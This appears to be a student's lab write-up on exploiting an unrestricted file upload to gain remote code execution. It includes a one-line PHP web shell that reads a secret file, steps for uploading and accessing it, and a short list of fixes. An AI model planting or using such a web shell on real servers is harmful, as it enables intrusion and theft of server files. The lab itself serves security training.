# Lab 1 - Remote code execution via web shell upload
This lab demonstrates how an unrestricted file upload can lead to remote code execution.

## Vulnerability Type
Unrestricted File Upload -> Web Shell Upload -> RCE

## Goal
Upload a web shell and retrieve the secret from the server.

## Exploitation Steps
1.Create a PHP web shell:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
2.Upload shell.php
3.Access:
```
/file/shell.php
```
4.Retrieve the secret.

## Key Point
Server does not validate file extension or content.

## Security Fix
- Validate file type
- Restrict executable extensions
- Store uploads outside web root

## My Reflection
This lab is similar to Natas12 basic file upload logic.
